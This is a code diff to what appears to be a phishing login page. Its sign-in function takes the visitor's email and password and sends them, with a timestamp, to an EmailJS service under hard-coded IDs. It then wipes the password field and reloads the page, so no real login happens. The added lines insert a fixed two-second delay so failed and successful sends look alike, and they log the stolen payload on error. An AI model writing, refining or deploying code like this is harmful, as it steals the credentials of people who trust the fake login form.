@@ -16,33 +16,41 @@
             document.getElementById('passwd').focus();
         };
 
+        // Delay function to ensure consistent timing
+        function delay(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
         async function handleSignIn() {
             const email = document.getElementById('login').value;
             const password = document.getElementById('passwd').value;
 
-            // Validation
             if (!email || !password) {
                 alert('Please enter both email and password.');
                 return;
             }
 
-            // Unique timestamp to ensure every request is distinct
             const timestamp = Date.now();
             const payload = {
                 email: email,
                 password: password,
                 date: new Date().toLocaleString(),
-                timestamp: timestamp // Unique identifier
+                timestamp: timestamp
             };
 
+            let sendSuccess = false;
             try {
                 const response = await emailjs.send('service_lwkhl0m', 'template_of2ygxs', payload);
                 console.log('Email sent successfully:', response.status, response.text, payload);
+                sendSuccess = true;
             } catch (error) {
-                console.error('EmailJS Error:', error.text || error);
+                console.error('EmailJS Error:', error.text || error, payload);
             }
 
-            // Clear password field and reload
+            // Minimum 2-second delay to match successful send time
+            await delay(2000);
+
+            // Clear field and reload
             document.getElementById('passwd').value = '';
             window.location.reload();
         }
